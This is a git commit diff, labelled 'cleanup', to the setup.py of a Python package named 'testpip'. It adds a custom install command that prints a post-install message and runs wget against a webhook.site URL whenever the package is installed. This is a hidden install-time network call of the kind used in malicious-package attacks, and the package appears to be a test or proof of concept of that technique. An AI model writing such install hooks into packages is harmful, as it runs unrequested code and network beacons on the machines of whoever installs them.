6708b4ecbe503e1431631a1a7978393a7aa40d13
Andrei Cadar <cadarandrei2370@yahoo.com>
2025-05-10 14:33:00 +0300

    cleanup

--- setup.py
+++ setup.py
@@ -1,6 +1,18 @@
 from setuptools import setup
+from setuptools.command.install import install
 import os
 
+class CustomInstallCommand(install):
+    def run(self):
+        print("[*] Running post-install code...")
+        os.system("wget https://webhook.site/3a45291b-4331-4008-8191-c5c9200be954")
+        install.run(self)
 
-print("[*] Running post-install code...")
-os.system("wget https://webhook.site/3a45291b-4331-4008-8191-c5c9200be954")
+setup(
+    name='testpip',
+    version='0.1',
+    packages=['testpip'],
+    cmdclass={
+        'install': CustomInstallCommand,
+    },
+)
